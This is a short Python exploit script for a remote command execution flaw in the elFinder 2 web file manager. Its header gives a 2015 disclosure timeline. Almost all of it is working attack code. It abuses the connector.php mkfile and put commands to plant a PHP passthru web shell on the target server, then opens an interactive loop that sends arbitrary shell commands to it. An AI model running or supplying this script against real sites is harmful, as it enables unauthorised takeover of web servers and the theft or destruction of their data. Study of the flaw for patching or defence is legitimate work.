#[+] Title: elFinder 2 Remote Command Execution (Via File Creation) Vulnerability
#[+] Date: 06-05-2015
#[+] Vendor: https://github.com/Studio-42/elFinder
#[+] Type: WebAPP
#[+] Tested on: KaliLinux (Debian)
#[+] Twitter: @TCYB3R
#[+] Time Line:
#    03-05-2015:Vulnerability Discovered
#    03-05-2015:Contacted Vendor
#    04-05-2015:No response
#    05-05-2015:No response
#    06-05-2015:No response
#    06-05-2015:Vulnerability published

import cookielib, urllib
import urllib2
import sys

print"\x20\x20+-------------------------------------------------+"
print"\x20\x20| elFinder Remote Command Execution Vulnerability |"
print"\x20\x20|                 TUNISIAN CYBER                  |"
print"\x20\x20+-------------------------------------------------+"


host = raw_input(&#039;\x20\x20Vulnerable Site:&#039;)
evilfile = raw_input(&#039;\x20\x20EvilFileName:&#039;)
path=raw_input(&#039;\x20\x20elFinder s Path:&#039;)


tcyber = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(tcyber))

create = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/php/connector.php?cmd=mkfile&name=&#039;+evilfile+&#039;&target=l1_Lw&#039;)
#print create.read()

payload = urllib.urlencode({
                            &#039;cmd&#039; : &#039;put&#039;,
                            &#039;target&#039; : &#039;l1_&#039;+evilfile.encode(&#039;base64&#039;,&#039;strict&#039;),
                            &#039;content&#039; : &#039;<?php passthru($_GET[\&#039;cmd\&#039;]); ?>&#039;
                            })

write = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/php/connector.php&#039;, payload)
#print write.read()
print &#039;\n&#039;
while True:
    try:
        cmd = raw_input(&#039;[She3LL]:~# &#039;)

        execute = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin/js/plugins/elfinder/files/&#039;+evilfile+&#039;?cmd=&#039;+urllib.quote(cmd))
        reverse = execute.read()
        print reverse;

        if cmd.strip() == &#039;exit&#039;:
            break

    except Exception:
        break

sys.exit()

